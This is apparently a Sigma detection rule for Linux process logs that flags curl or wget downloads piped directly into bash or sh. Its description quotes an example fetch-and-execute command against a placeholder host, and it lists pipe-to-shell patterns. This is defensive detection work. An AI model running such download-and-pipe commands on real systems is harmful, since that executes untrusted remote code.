title: Remote Payload Downloaded and Piped to a Shell
id: 7f3a1e20-0a01-4a10-9e01-a1b2c3d4e001
status: experimental
description: |
    Detects the classic "download cradle" pattern where a file transfer utility
    (curl/wget) downloads a payload that is piped directly into a shell
    interpreter (e.g. `curl http://host/x.sh | bash`). This executes attacker
    content without ever touching disk and is a very common initial-access and
    execution technique on Linux.
references:
    - https://attack.mitre.org/techniques/T1059/004/
    - https://gtfobins.github.io/gtfobins/curl/
author: sentinel-as-code
date: 2026-01-15
modified: 2026-01-15
tags:
    - attack.execution
    - attack.t1059.004
logsource:
    product: linux
    category: process_creation
detection:
    selection_downloader:
        process.command_line|contains:
            - 'curl '
            - 'wget '
    selection_pipe_to_shell:
        process.command_line|contains:
            - '|bash'
            - '| bash'
            - '|sh'
            - '| sh'
            - '|/bin/bash'
            - '| /bin/bash'
            - '|/bin/sh'
            - '| /bin/sh'
    condition: selection_downloader and selection_pipe_to_shell
falsepositives:
    - Administrators legitimately running documented install scripts via a pipe
      to a shell (e.g. some vendor install one-liners). Tune by allow-listing
      known-good hosts/URLs.
level: high
